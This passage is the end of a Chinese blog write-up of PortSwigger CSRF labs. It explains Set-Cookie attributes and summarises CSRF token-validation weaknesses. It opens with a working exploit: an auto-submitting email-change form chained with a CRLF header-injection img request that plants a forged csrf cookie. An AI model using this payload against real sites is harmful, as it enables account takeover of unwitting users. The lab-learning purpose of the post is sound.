+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a6c006003b0d45381bdd0400091006a.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111@gmail.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0a6c006003b0d45381bdd0400091006a.web-security-academy.net/?search=test%0d%0aSet-Cookie%3A%20csrf%3DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3B%20SameSite=None&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果不加 <code>SameSite=None</code>，则很难利用漏洞，具体后面解释。</p>
+<h2 id="0x03-Cookie-属性"><a href="#0x03-Cookie-属性" class="headerlink" title="0x03. Cookie 属性"></a>0x03. Cookie 属性</h2><p><code>Set-Cookie</code> 语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;number&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Partitioned</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span><br><span class="line"></span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Lax</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=None; Secure</span><br><span class="line"></span><br><span class="line">// 可以同时有多个属性，例如：</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
+
+<p>相关解释：</p>
+<ul>
+<li><strong>HttpOnly</strong><ul>
+<li>阻止 JavaScript 通过 <code>document.cookie</code> 属性访问 Cookie。注意，设置了 <code>HttpOnly</code> 的 Cookie 仍然会通过 JavaScript 发起的请求发送。</li>
+<li>用于抵抗 XSS 攻击。</li>
+</ul>
+</li>
+<li><strong>Secure</strong><ul>
+<li>表示仅当请求通过 <code>https</code> 协议（localhost 不受此限制）发送时才会将该 Cookie 发送到服务器，因此其更能够抵抗<strong>中间人</strong>攻击。</li>
+</ul>
+</li>
+<li><strong>SameSite</strong><ul>
+<li>控制 Cookie 是否随跨站请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）</li>
+<li><code>Strict</code><ul>
+<li>这意味浏览器仅对同一站点的请求发送 Cookie，即请求来自设置 Cookie 的站点。如果请求来自不同的域名或协议（即使是相同域名），则携带有 <code>SameSite=Strict</code> 属性的 Cookie 不会被发送。</li>
+</ul>
+</li>
+<li><code>Lax</code><ul>
+<li>这意味着 Cookie 不会在跨站请求中被发送，如：加载图像或框架（frame）的请求。但 Cookie 在用户从外部站点导航到源站时，Cookie 也会被发送（例如，访问一个链接）。这是 <code>SameSite</code> 属性未被设置时的默认行为。</li>
+</ul>
+</li>
+<li><code>None</code><ul>
+<li>这意味着浏览器在跨站和同站请求中均会发送 Cookie。在设置这一属性值时，必须同时设置 <code>Secure</code> 属性，就像这样：<code>SameSite=None; Secure</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>可以看出，未显示设置 <code>SameSite=None</code> 时，<code>SameSite</code> 属性默认为 <code>Lax</code>，导致跨站发送请求时 Cookie 不能正常发送。</p>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><ul>
+<li>不同类型的 CSRF 触发方法，GET 简单，POST 要提交表单稍微复杂点<ul>
+<li>GET 可以使用 <code>&lt;img&gt;</code> 或者 <code>&lt;iframe&gt;</code> 之类的</li>
+<li>组合漏洞利用场景下，利用 <code>&lt;img src</code> 触发 GET 请求，利用 <code>&lt;img onerror</code> 触发 POST 请求</li>
+</ul>
+</li>
+<li>对于同样的功能，可以尝试测试不同的 HTTP 请求方法</li>
+<li>校验不严格场景<ul>
+<li>仅 CSRF Token 存在时才能起到防御效果</li>
+<li>CSRF Token 未与用户 Session 绑定</li>
+<li>CSRF Token 绑定的是非 Session Cookie</li>
+</ul>
+</li>
+<li>了解 Cookie 的属性</li>
+</ul>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf">https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Burp/" rel="tag"># Burp</a>
+              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+              <a href="/tags/Cookie/" rel="tag"># Cookie</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/09/vulnerability-trends-of-2024/" rel="prev" title="[资源合集] 2024 年度漏洞趋势总结报告">
+                  <i class="fa fa-angle-left"></i> [资源合集] 2024 年度漏洞趋势总结报告
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
